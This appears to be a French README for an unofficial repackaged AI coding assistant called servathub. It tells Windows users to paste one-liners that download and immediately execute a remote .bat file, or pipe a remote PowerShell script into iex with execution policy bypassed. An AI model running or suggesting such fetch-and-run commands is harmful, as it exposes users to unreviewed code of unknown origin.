# servathub v1.8

Assistant de codage IA gratuit base sur l'interface de chat, avec le modele **DeepSeek V4 Flash**, sans aucune publicite.

> **Version finale** - DeepSeek V4 Flash uniquement, gratuit et illimite

- Aucune pub
- 1 modele IA : DeepSeek V4 Flash (illimite)
- Chaque utilisateur se connecte avec son propre compte (gratuit)
- Pas de bug "freebuff CLI"

## Installer (Windows)

Ouvre un **invite de commandes (cmd)** et colle une de ces lignes :

**Methode curl (recommandee) :**

```
curl -fsSL https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/servathub-v1.8/install.bat -o "%TEMP%\sv-install.bat" && "%TEMP%\sv-install.bat"
```

**Methode PowerShell :**

```
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/servathub-v1.8/install.ps1 | iex"
```

Puis **ouvre un nouveau cmd** et tape :

```
servathub
```

## Pourquoi cette version ?

La version v1.0.6+ (avec Claude Fable 5) affiche cette erreur :

```
ErrorFree mode is only available through the freebuff CLI. 
Install it with `npm i -g freebuff`, then run `freebuff`.
```

Cette version v1.8 utilise la v1.0.5 (stable) qui ne contient que DeepSeek V4 Flash.

## Mettre a jour

Re-execute simplement la commande d'installation.

## Manuel

- L'installeur copie les fichiers dans `%USERPROFILE%\servathub` et ajoute ce dossier au PATH de l'utilisateur.
- Au premier lancement, connecte-toi avec un compte gratuit (la page de connexion s'ouvre toute seule).
- `servathub.exe` doit toujours rester a cote de `tree-sitter.wasm` (fichier requis au demarrage).
